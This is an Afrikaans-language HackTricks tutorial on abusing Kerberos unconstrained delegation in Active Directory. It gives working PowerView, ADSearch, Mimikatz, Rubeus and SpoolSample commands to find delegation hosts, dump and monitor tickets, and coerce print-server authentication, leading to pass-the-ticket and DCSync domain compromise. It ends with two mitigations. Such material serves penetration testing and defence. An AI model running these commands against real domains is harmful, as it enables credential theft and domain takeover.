# Onbeperkte Afvaardiging

{{#include ../../banners/hacktricks-training.md}}

## Onbeperkte afvaardiging

Dit is 'n kenmerk wat 'n Domein Administrateur kan stel op enige **Rekenaar** binne die domein. Dan, wanneer 'n **gebruiker aanmeld** op die Rekenaar, sal 'n **kopie van die TGT** van daardie gebruiker **binne die TGS** wat deur die DC **gestuur word en in geheue in LSASS gestoor word**. So, as jy Administrateur regte op die masjien het, sal jy in staat wees om die **kaartjies te dump en die gebruikers te vervang** op enige masjien.

So as 'n domein admin aanmeld op 'n Rekenaar met die "Onbeperkte Afvaardiging" kenmerk geaktiveer, en jy het plaaslike admin regte op daardie masjien, sal jy in staat wees om die kaartjie te dump en die Domein Admin enige plek te vervang (domein privesc).

Jy kan **Rekenaar voorwerpe met hierdie attribuut vind** deur te kyk of die [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) attribuut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) bevat. Jy kan dit doen met 'n LDAP filter van ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, wat is wat powerview doen:

<pre class="language-bash"><code class="lang-bash"># Lys onbeperkte rekenaars
## Powerview
Get-NetComputer -Unconstrained #DCs verskyn altyd maar is nie nuttig vir privesc nie
<strong>## ADSearch
</strong>ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># Eksporteer kaartjies met Mimikatz
</strong>privilege::debug
sekurlsa::tickets /export #Aanbevole manier
kerberos::list /export #Nog 'n manier

# Monitor aanmeldings en eksport nuwe kaartjies
.\Rubeus.exe monitor /targetuser:<username> /interval:10 #Kontroleer elke 10s vir nuwe TGTs</code></pre>

Laai die kaartjie van die Administrateur (of slagoffer gebruiker) in geheue met **Mimikatz** of **Rubeus vir 'n** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Meer inligting: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Meer inligting oor Onbeperkte afvaardiging in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Forceer Verifikasie**

As 'n aanvaller in staat is om 'n **rekenaar wat toegelaat word vir "Onbeperkte Afvaardiging" te kompromitteer**, kan hy 'n **Druk bediener** **mislei** om **outomaties aan te meld** teen dit **en 'n TGT in die geheue van die bediener te stoor**.\
Dan kan die aanvaller 'n **Pass the Ticket aanval uitvoer om** die gebruiker se Druk bediener rekenaarrekening te vervang.

Om 'n druk bediener teen enige masjien aan te meld, kan jy [**SpoolSample**](https://github.com/leechristensen/SpoolSample) gebruik:
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
As die TGT van 'n domeinbeheerder is, kan jy 'n [**DCSync-aanval**](acl-persistence-abuse/index.html#dcsync) uitvoer en al die hashes van die DC verkry.\
[**Meer inligting oor hierdie aanval in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**Hier is ander maniere om te probeer om 'n outentisering te dwing:**

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Versagting

- Beperk DA/Admin aanmeldings tot spesifieke dienste
- Stel "Rekening is sensitief en kan nie gedelegeer word nie" vir bevoorregte rekeninge.

{{#include ../../banners/hacktricks-training.md}}
